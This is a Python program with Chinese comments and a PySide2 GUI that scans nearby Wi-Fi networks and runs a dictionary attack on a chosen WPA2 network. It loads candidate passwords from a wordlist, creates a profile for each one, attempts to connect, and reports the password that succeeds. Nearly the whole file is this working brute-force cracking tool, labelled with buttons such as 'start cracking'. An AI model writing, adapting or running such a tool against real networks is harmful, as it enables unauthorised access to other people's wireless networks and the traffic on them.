import threading
import pywifi
from pywifi import const
import time
from PySide2.QtWidgets import *
from PySide2.QtUiTools import QUiLoader
from PySide2.QtCore import QFile, QStringListModel
from PySide2.QtGui import QFont


class Wifi:
    wifi = pywifi.PyWiFi()
    try:
        iface = wifi.interfaces()[0]  # 返回的是一个列表，取第一个wifi网卡
    except Exception as e:
        print("获取网卡列表失败:", e)

    # 获取当前无线网卡信息
    def get_nic(self):
        return self.iface.name()



    # 扫描的wifi列表信息
    def scan_wifi_list(self):
        self.iface.disconnect()  # 断开当前wifi连接
        time.sleep(1)
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]  # 检查网卡是否处于断开状态
        self.iface.scan()  # 扫描附近AP
        time.sleep(2)  # 等待扫描完成
        results = self.iface.scan_results()  # 获取扫描结果
        ap_list_temp = []  # 使用列表来保持顺序
        seen = set()  # 用于去重
        for x in results:
            original_ssid = x.ssid  # 保存原始SSID
            ap_name = x.ssid.encode('raw_unicode_escape').decode('utf-8')  # 转换后用于显示
            # 使用original_ssid去重
            if original_ssid not in seen:
                seen.add(original_ssid)
                ap_list_temp.append((original_ssid, ap_name))  # 存储为元组(原始SSID, 显示名称)
        global ap_list
        ap_list = ap_list_temp  # ap_list现在是元组列表，顺序与显示列表一致
        model_list = QStringListModel()
        model_list.setStringList([ap[1] for ap in ap_list])  # 只使用显示名称用于UI显示
        return model_list

    # 开始破解
    def Crack(self, status_list):
        # 获取Stats类的实例，检查是否需要停止
        stats_instance = None
        for thread in threading.enumerate():
            if thread.name == "MainThread" and "Stats" in str(thread):
                stats_instance = thread
                break

        status_list.clear()
        global ssid_name
        global path
        N = 1

        # 检查是否需要停止
        if hasattr(stats_instance, 'is_cracking') and not stats_instance.is_cracking:
            status_list.addItem("破解已停止")
            return

        # 读取字典
        try:
            if path[0] != " ":
                print("字典已选择" + path[0])
                with open(path[0], "r") as file:

                    # 遍历所有配置文件
                    profiles = self.iface.network_profiles()
                    for x in profiles:
                        if x.ssid == ssid_name:
                            print(f"发现旧的 '{ssid_name}' 配置，正在移除以确保使用新密码...")
                            self.iface.remove_network_profile(x)
                            break  # 找到并删除后即可退出循环

                    while True:
                        # 检查是否需要停止
                        if hasattr(stats_instance, 'is_cracking') and not stats_instance.is_cracking:
                            status_list.addItem("破解已停止")
                            return

                        self.iface.disconnect()  # 断开当前wifi连接
                        time.sleep(2)
                        if 'tmp_profile' in locals():
                            self.iface.remove_network_profile(tmp_profile)

                        # 设置配置文件
                        profile = pywifi.Profile()
                        profile.ssid = ssid_name
                        profile.auth = const.AUTH_ALG_OPEN                  # const.AUTH_ALG_OPEN / SHARED
                        profile.akm = [const.AKM_TYPE_WPA2PSK]             # const.AKM_TYPE_WPA2PSK / WPA3PSK
                        profile.cipher = const.CIPHER_TYPE_CCMP             # const.CIPHER_TYPE_ NONE / WEP / TKIP / CCMP

                        # 获取字典密码
                        tmp_str = file.readline()
                        if tmp_str == '':
                            status_list.addItem(f"{N}. 密码字典已用完")
                            return
                        password = tmp_str.strip()
                        if len(password) >= 8:
                            print(f"当前破解wifi：{profile.ssid}")
                            print(f"ssid_name：{repr(ssid_name)}")  # 调试信息
                            print(f"password：{repr(password)}")
                            profile.key = password
                            tmp_profile = self.iface.add_network_profile(profile)
                            status_list.addItem(f"{N}. 尝试密码：{password}")
                            self.iface.connect(tmp_profile)
                            # 增加等待时间和状态检查
                            for i in range(9):  # 增加到15秒
                                # 检查是否需要停止
                                if hasattr(stats_instance, 'is_cracking') and not stats_instance.is_cracking:
                                    status_list.addItem("破解已停止")
                                    return

                                time.sleep(1)
                                tmp_status = self.iface.status()
                                print(f"等待轮询{i+1}：iface.status = {tmp_status}")
                                # const.IFACE_CONNECTED / 0 DISCONNECTED /1 SCANNING /2 INACTIVE / 3 CONNECTING /4 CONNECTED /
                                if tmp_status == const.IFACE_CONNECTED:
                                    status_list.addItem(f"{N}. 破解成功：{password}")
                                    return
                                elif tmp_status == const.IFACE_CONNECTING:
                                    print(f"正在连接中...")
                                    continue
                        else:
                            status_list.addItem(f"{N}. 不符合要求密码：{password}")
                            continue
                        status_list.scrollToBottom()
                        N += 1
        except Exception as e:
            print(f"攻击异常:{e}")
            return



class Stats:
    def __init__(self):
        self.wifi = Wifi()
        self.crack_thread = None  # 保存破解线程的引用
        self.is_cracking = False  # 标记是否正在破解

        # 从文件加载UI界面
        qfile_stats = QFile("ui_Main.ui")
        qfile_stats.open(QFile.ReadOnly)
        qfile_stats.close()
        self.ui = QUiLoader().load(qfile_stats)

        # UI界面设置网卡信息
        self.ui.comboBox.addItem(self.wifi.get_nic())
        # self.ui.auth.setText("const.AUTH_ALG_WPA2PSK")
        # self.ui.safe.setText("const.AKM_TYPE_WPA2PSK")
        # self.ui.pass_type.setText("const.CIPHER_TYPE_CCMP")

        self.ui.scan_wifi.clicked.connect(self.scan)    # 扫描wifi按钮绑定事件
        self.ui.select_dict.clicked.connect(self.path)   # 选择字典按钮事件
        self.ui.wifi_list.clicked.connect(self.select_wifi_list)    # list被选中
        self.ui.Start_Crack.clicked.connect(self.Crack)  # 破解按钮绑定事件

        # 设置窗口关闭事件处理
        self.ui.closeEvent = self.closeEvent

    def scan(self):
        APs = self.wifi.scan_wifi_list()   # UI界面设置获取的扫描结果
        self.ui.wifi_list.setModel(APs)

    def path(self):
        global path
        path = QFileDialog.getOpenFileName()
        self.ui.textBrowser.setText(path[0])

    def select_wifi_list(self, item):
        global ap_list
        global ssid_name
        # ap_list现在是元组列表，元组格式为(original_ssid, ap_name)
        ssid_tuple = ap_list[item.row()]
        ssid_name = ssid_tuple[0]  # 获取原始SSID用于WiFi配置
        display_name = ssid_tuple[1]  # 获取显示名称用于UI显示
        self.ui.ssid.setText(display_name)  # UI显示使用转换后的名称

    def Crack(self):
        # 防止界面卡死，开启多线程运行，后台破解
        if not self.is_cracking:
            self.is_cracking = True
            self.crack_thread = threading.Thread(target=self.wifi.Crack, args=(self.ui.status_list,))
            self.crack_thread.start()
            self.ui.Start_Crack.setText("停止破解")
            self.ui.Start_Crack.clicked.disconnect()
            self.ui.Start_Crack.clicked.connect(self.stop_crack)
        else:
            self.stop_crack()

    def stop_crack(self):
        # 停止破解线程
        if self.crack_thread and self.crack_thread.is_alive():
            # 这里需要修改wifi.Crack方法，使其能够响应停止信号
            # 由于pywifi没有直接的停止方法，我们可能需要其他方式
            # 这里简单地将is_cracking设为False，并在Crack方法中检查
            self.is_cracking = False
            self.ui.Start_Crack.setText("开始破解")
            self.ui.Start_Crack.clicked.disconnect()
            self.ui.Start_Crack.clicked.connect(self.Crack)

    def closeEvent(self, event):
        # 窗口关闭时停止破解线程
        if self.crack_thread and self.crack_thread.is_alive():
            self.is_cracking = False
            # 等待线程结束
            self.crack_thread.join(timeout=2)
            if self.crack_thread.is_alive():
                print("警告：破解线程未能正常结束")
        event.accept()


if __name__ == '__main__':
    app = QApplication([])
    font = QFont("Microsoft YaHei", 10)
    app.setFont(font)
    stats1 = Stats()
    stats1.ui.show()
    app.exec_()
